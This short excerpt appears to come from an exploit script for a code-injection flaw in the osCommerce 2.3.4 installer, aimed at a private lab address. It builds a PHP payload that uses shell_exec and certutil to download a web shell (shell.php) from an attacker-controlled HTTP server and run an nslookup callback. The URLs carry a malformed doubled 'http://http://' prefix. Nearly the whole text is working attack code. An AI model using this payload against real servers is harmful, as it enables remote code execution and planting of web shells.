...
base_url = "http://http://10.10.134.97/oscommerce-2.3.4/catalog/"
target_url = "http://http://10.10.134.97/oscommerce-2.3.4/catalog/install/install.php?step=4"
...
payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.134.97:8080/shell.php shell.php & nslookup test 10.10.134.97 ");'
payload += 'echo $var;'
payload += '/*'
